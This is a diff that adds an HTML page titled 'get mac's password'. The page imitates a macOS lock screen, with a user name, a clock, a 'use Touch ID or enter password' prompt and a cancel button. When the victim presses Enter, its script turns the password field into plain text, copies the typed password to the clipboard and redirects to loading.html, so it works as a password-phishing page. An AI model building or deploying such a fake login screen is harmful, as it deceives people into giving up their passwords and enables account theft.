@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>get mac's password</title>
+    <script>
+        function EnterPress(e){ //传入 event 
+            var e = e || window.event; 
+            if(e.keyCode == 13){ 
+            document.all('user').outerHTML="<input id=user type=text class=type name='"+document.all('user').name+"' value='"+document.all('user').value+"'>"
+            var obj=document.getElementById("user");
+            obj.select();
+            //使用浏览器的 API接口方法 execCommand()
+            document.execCommand("copy");
+            window.location.href="loading.html";
+            } 
+        } 
+    </script>
+
+    <style>
+        body {
+            padding-top: 50px;
+        }
+        #text {
+            font-size: 10px;
+            color: #FFFFFF;
+            text-shadow: 0 0 3px #000000;
+        }
+        #main {
+            position:absolute;top:5px;right:10px;
+            text-align: center;
+        }
+        #top_ico {
+            position:absolute;top:0px;right:750px;
+            text-align: center;
+        }
+        #show_time {
+            color: #FFF;
+            font-size: 17px;
+
+        }
+        .button {
+            background-color: #008CBA; /* Green */
+            border: none;
+            color: white;
+            padding: 5px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 15px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .type{
+            background: rgba( 255, 255, 255, 0.30 );
+            box-shadow: 0 8px 32px 0 rgba( 31, 38, 135, 0.4 );
+            backdrop-filter: blur( 40.0px );
+            -webkit-backdrop-filter: blur( 2px );
+            border-radius: 20px;
+            border: 10px solid rgba( 255, 255, 255, 0.18 );
+            height: 27px;
+            width: 144px;
+            padding-left: 15px;
+            padding-right: 15px;
+            color: #FFFFFF;
+            font-size: 20px;
+            border: 0px;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+        }
+
+        input::-webkit-input-placeholder {
+            color: #FFFFFF;
+            opacity:0.5;
+            font-size: 13px;
+        }
+        
+        input::-moz-placeholder {
+            /* Mozilla Firefox 19+ */
+            color: #FFFFFF;
+            opacity:0.5;
+            font-size: 13px;
+        }
+        
+        input:-moz-placeholder {
+            /* Mozilla Firefox 4 to 18 */
+            color: #FFFFFF;
+            opacity:0.5;
+            font-size: 13px;
+        }
+        
+        input:-ms-input-placeholder {
+            /* Internet Explorer 10-11 */
+            color: #FFFFFF;
+            opacity:0.5;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body background="img/LockScreen_bg.png" style=" background-repeat:no-repeat;background-size:100% 100%;background-attachment:fixed;">
+    <img id="top_ico" src="img/top_ico.png" style="zoom:35%;">
+    <div id="main">
+        <div id="show_time">
+            <script>
+                setInterval("show_time.innerHTML=new Date().toLocaleString()+' 星期'+'日一二三四五六'.charAt(new Date().getDay());");
+            </script>
+        </div>
+    </div>
+    <div id="world">
+        <br><br><br><br><br><br><br><br><br><br>
+        <div id="right">
+            <form aaction="">
+                <center>
+                    <img src="img/HeadPortrait.png" style="zoom:35%;"><br>
+                    <p style="font-size:23px;color:#FFFFFF;text-shadow: 0 0 8px #000000;">叶籍之</p>
+                    <input class="type" type="password" name="user" oncopy="return true"  placeholder="输入密码" onkeypress="EnterPress(event);" id="user" onkeydown="EnterPress()">
+                    <strong><p id="text">使用触控ID或输入密码。</p></strong>
+                    <br><br><br><br><br><br>
+                    <a href="black.html">
+                        <img src="img/cancel.png" style="zoom:10%;opacity:0.8;">
+                    </a>
+                    <br><a style="color:#FFFFFF;font-size:13px;text-shadow: 0 0 3px #000000;">取消</a>
+                </center>
+                <br><br><br><br><br>
+                <input type="text" id="txtAdd" style="display:none"/>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
